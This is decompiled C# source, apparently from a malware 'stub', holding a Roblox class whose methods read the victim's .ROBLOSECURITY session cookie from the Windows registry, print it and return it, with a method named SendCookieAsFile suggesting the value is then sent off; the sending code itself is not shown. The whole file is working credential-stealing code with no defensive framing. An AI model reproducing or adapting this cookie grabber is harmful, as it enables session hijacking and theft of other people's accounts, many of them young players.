using System;
using Microsoft.Win32;

namespace Stub
{
	// Token: 0x02000026 RID: 38
	public static class Roblox
	{
		// Token: 0x06000070 RID: 112 RVA: 0x00002879 File Offset: 0x00000A79
		public static string SendCookieAsFile()
		{
			return Roblox.RobloxCookie();
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00006838 File Offset: 0x00004A38
		public static string RobloxCookie()
		{
			string result;
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com", false))
				{
					string text = registryKey.GetValue(".ROBLOSECURITY").ToString();
					text = text.Substring(46).Trim(new char[]
					{
						'>'
					});
					Console.WriteLine(text);
					result = text;
				}
			}
			catch
			{
				result = "No Roblox Cookie.";
			}
			return result;
		}
	}
}
